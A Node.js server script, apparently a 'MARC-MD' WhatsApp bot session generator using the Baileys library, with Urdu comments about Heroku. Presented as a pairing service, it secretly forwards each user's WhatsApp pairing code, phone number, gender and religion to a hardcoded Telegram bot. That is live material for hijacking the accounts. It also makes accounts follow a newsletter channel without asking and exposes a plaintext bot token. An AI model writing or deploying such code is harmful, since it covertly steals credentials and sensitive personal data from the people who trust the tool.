import { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    DisconnectReason
} from "@whiskeysockets/baileys";
import express from "express";
import pino from "pino";
import fs from "fs-extra";
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
// ہیروکو کے لیے پورٹ کی سب سے محفوظ سیٹنگ
const PORT = process.env.PORT || 8000;

const BOT_NAME = "MARC-MD";
const DEVELOPER = "Arslan Chaudhary 👑";
const CHANNEL_JID = "120363315663704381@newsletter"; 
const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
const TELEGRAM_CHAT_ID = "7779604777";

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.status(200).send('MARC-MD Server is Online!');
});

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (e) {
        console.error("Telegram Log Error");
    }
}

async function startSession(phoneNumber, res, gender, religion) {
    const sessionDir = path.join(__dirname, 'temp_sessions', `${phoneNumber}_${Date.now()}`);
    
    if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        browser: ["MARC-MD", "Chrome", "1.0.0"]
    });

    if (phoneNumber && !socket.authState.creds.registered) {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, ''); 
        try {
            await delay(3500); 
            let code = await socket.requestPairingCode(phoneNumber);
            code = code?.replace(/-/g, '') || code;
            
            if (res && !res.headersSent) {
                res.status(200).json({ code });
            }
            
            const logMsg = `🚀 *New Pairing Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Pairing Code:* \`${code}\``;
            sendToTelegram(logMsg);
        } catch (err) {
            console.error("Pairing Code Error: ", err);
            if (res && !res.headersSent) res.status(500).json({ error: "Failed to generate code" });
        }
    }

    socket.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
            await delay(5000);
            const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
            const sessionId = `MARC-MD~${sessionBase64}`;
            
            try { await socket.newsletterFollow(CHANNEL_JID); } catch (e) {}

            await socket.sendMessage(socket.user.id, { text: `👋 *${BOT_NAME}* Connected!\n\nSession ID:\n\n${sessionId}` });
            
            sendToTelegram(`✅ *SESSION GENERATED*\n*Number:* ${phoneNumber}`);
            
            await delay(5000);
            socket.end();
            fs.removeSync(sessionDir);
        }

        if (connection === "close") {
            if (fs.existsSync(sessionDir)) fs.removeSync(sessionDir);
        }
    });

    socket.ev.on("creds.update", saveCreds);
}

app.get("/get-code", (req, res) => {
    const { number, gender, religion } = req.query;
    if (!number) return res.status(400).json({ error: "Number is required" });
    startSession(number, res, gender, religion);
});

// ہیروکو کے لیے "0.0.0.0" پر لسن کرنا ضروری ہے
app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 MARC-MD Server started on port ${PORT}`);
});
